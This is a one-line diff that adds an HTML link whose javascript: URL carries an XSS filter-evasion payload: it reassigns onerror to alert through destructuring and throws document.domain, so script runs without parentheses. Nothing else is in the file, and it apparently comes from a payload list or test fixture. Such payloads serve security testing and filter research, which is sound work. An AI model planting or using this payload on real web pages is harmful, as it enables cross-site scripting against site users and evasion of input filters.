@@ -1,0 +1,1 @@
+<a href="javascript:var{a:onerror}={a:alert};throw%20document.domain;">click</a>
